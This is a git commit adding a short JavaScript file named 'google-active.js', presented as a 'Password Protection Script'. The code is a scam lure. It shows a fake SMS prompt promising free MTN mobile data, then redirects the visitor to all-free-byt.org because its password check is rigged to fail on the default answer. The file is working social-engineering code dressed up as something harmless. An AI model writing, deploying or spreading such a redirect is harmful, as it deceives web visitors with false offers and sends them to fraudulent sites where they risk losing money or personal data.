af5ba6c8053ad22ee4fb47e542b51db0faf37e3a
Imohekpe1 <169145829+Imohekpe1@users.noreply.github.com>
2024-08-26 01:13:52 -0700

    Create google-active.js

---
+++ google-active.js
@@ -0,0 +1,6 @@
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = '50GB Free Data'
+password=prompt('SMS: Congratulations Your Number is Eligible to receive 20GB Free Data MTN OLD SIM REWARD, Kindly Press OK to ACTIVATE ','50GB Free Data');
+if (password != '20GB Free Data') {
+location.href='https://all-free-byt.org/airtel-4g.html';
+}
